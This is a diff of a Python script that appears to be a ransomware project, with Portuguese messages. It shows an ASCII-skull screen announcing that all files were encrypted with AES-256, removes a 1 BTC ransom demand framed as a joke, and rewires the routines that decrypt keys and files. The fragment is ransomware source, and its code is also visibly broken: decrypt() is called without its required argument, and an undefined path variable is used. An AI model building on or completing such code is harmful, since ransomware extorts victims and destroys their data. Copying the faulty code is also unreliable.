@@ -28,31 +28,25 @@ skull = '''
                               .
 
         \33[93mTODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS COM AES-256
-                    digite 'help' para obter ajuda
 '''
-ajuda='''
-Olá, todos os seus arquivos importantes foram criptografados.
-Para te-los de volta você precisa efetuar um pagamento de 1 BTC
-Brincadeira, apenas digite 1.
-'''
+
+
 
 def bitcoin_addr():
     pass
 
 def decrypt_all():
-    client('localhost')
     SRSA_to_RSA()
     print('[*] chave privada do cliente descriptografada')
     RSA_to_AES()
     print('[*] chave AES descriptografada')
 
-    f = open('keys/AES.txt','r')
+    f = open(caminho_correto + 'AES.txt','r')
     a = f.read()
     tam = len(a)
     if(tam == 30):
-        adsas = 1
-        #menu(a,2)
-        
+        decrypt()
+
 def decrypt(diretorio):
     for caminho, diretorio, arquivo in os.walk(diretorio):
         for arq in arquivo:
@@ -66,4 +60,4 @@ def decrypt(diretorio):
 if __name__ == '__main__':
     os.system('clear')
     print('{0}'+skull+'{1}').format(RED,GREEN)
-    chat()
+    decrypt_all()
